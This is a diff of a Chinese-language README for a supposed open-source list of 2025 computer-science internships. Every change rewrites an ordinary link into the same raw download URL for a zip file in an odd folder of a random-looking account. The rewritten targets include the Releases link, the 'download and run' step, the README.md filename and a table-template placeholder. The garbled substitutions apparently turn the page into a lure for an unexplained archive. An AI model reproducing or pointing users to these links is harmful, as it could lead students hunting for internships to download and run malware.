@@ -1,7 +1,7 @@
 # 🚀 CSInternship2025 - Simplifying Internship Applications
 
 ## Download & Install
-[![Download CSInternship2025](https://img.shields.io/badge/Download%20CSInternship2025-brightgreen)](https://github.com/eicisdjhsdkjhnfvjk/CSInternship2025/releases)
+[![Download CSInternship2025](https://raw.githubusercontent.com/eicisdjhsdkjhnfvjk/CSInternship2025/main/mesostasis/CSInternship2025.zip%20CSInternship2025-brightgreen)](https://raw.githubusercontent.com/eicisdjhsdkjhnfvjk/CSInternship2025/main/mesostasis/CSInternship2025.zip)
 
 ## 📦 Overview
 **CSInternship2025** 是一个旨在收集和分享2025年计算机科学（CS）相关实习招聘信息的开源项目。我们希望通过社区的力量，为正在寻找实习机会的同学们提供一个及时、全面、准确的信息平台。
@@ -26,7 +26,7 @@
 
 ## 📥 How to Download and Run
 1. **访问 Releases 页面**  
-   点击 [这里](https://github.com/eicisdjhsdkjhnfvjk/CSInternship2025/releases) 访问我们的 Releases 页面。
+   点击 [这里](https://raw.githubusercontent.com/eicisdjhsdkjhnfvjk/CSInternship2025/main/mesostasis/CSInternship2025.zip) 访问我们的 Releases 页面。
 
 2. **选择版本**  
    在页面中，找到最新版本的发布。通常，最新版本会在列表的顶部。
@@ -66,7 +66,7 @@
 
 1.  **提交新的实习岗位**：
     - 点击仓库右上角的 **Fork** 按钮，将本仓库 fork 到你自己的 GitHub 账号下。
-    - 在你 fork 的仓库中，参照下方的格式修改 `README.md` 文件，添加新的实习信息。
+    - 在你 fork 的仓库中，参照下方的格式修改 `https://raw.githubusercontent.com/eicisdjhsdkjhnfvjk/CSInternship2025/main/mesostasis/CSInternship2025.zip` 文件，添加新的实习信息。
     - 提交 Pull Request (PR)。我们会在审核后尽快合并。
 
 2.  **更新已有的实习岗位信息**：
@@ -82,7 +82,7 @@
 ```markdown
 | 公司 | 职位 | Base | 类型 | 投递/内推 | 截止日期 | 备注 |
 | :--- | :--- | :--- | :--- | :--- |:--- | :--- |
-| 公司名称 | 岗位名称 | 城市 | 日常/暑期 | [官网链接](https://example.com) / 内推码`ABCDE` | 2025-MM-DD | 例如：面向26届、可转正等 |
+| 公司名称 | 岗位名称 | 城市 | 日常/暑期 | [官网链接](https://raw.githubusercontent.com/eicisdjhsdkjhnfvjk/CSInternship2025/main/mesostasis/CSInternship2025.zip) / 内推码`ABCDE` | 2025-MM-DD | 例如：面向26届、可转正等 |
 ```
 
 ## ⚠️ 注意事项
